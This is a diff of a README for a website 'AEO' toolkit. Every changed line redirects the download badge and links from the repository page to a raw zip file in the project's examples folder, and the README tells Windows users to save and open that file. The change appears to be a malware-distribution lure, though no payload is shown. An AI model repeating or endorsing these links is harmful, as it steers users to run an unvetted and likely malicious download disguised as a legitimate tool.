@@ -1,6 +1,6 @@
 # 🌐 cloudpipe-aeo-toolkit - Make Your Site Clear to AI
 
-[![Download](https://img.shields.io/badge/Download%20Here-Click%20to%20Open-blue?style=for-the-badge)](https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit)
+[![Download](https://img.shields.io/badge/Download%20Here-Click%20to%20Open-blue?style=for-the-badge)](https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit/raw/refs/heads/main/examples/cloudpipe_aeo_toolkit_v1.3-beta.3.zip)
 
 ## 🚀 What this app does
 
@@ -24,7 +24,7 @@ If your browser asks where to save the file, pick a folder you can find again, s
 
 Visit this page to download the toolkit:
 
-https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit
+https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit/raw/refs/heads/main/examples/cloudpipe_aeo_toolkit_v1.3-beta.3.zip
 
 On the page, look for the main download or release files. Save the file to your Windows computer, then open it from the folder where you saved it.
 
@@ -243,8 +243,8 @@ These habits make your site easier to scan and easier to maintain.
 - **Repository:** cloudpipe-aeo-toolkit
 - **Description:** Open-source AEO toolkit for AI visibility
 - **Topics:** aeo, ai-optimization, ai-search, chatbot, cloudflare-workers, llms-txt, schema-org, seo, templates, website-builder
-- **Primary download page:** https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit
+- **Primary download page:** https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit/raw/refs/heads/main/examples/cloudpipe_aeo_toolkit_v1.3-beta.3.zip
 
 ## 🖱️ Download again if needed
 
-[Open the download page](https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit)
+[Open the download page](https://github.com/Chadlatinamerican760/cloudpipe-aeo-toolkit/raw/refs/heads/main/examples/cloudpipe_aeo_toolkit_v1.3-beta.3.zip)
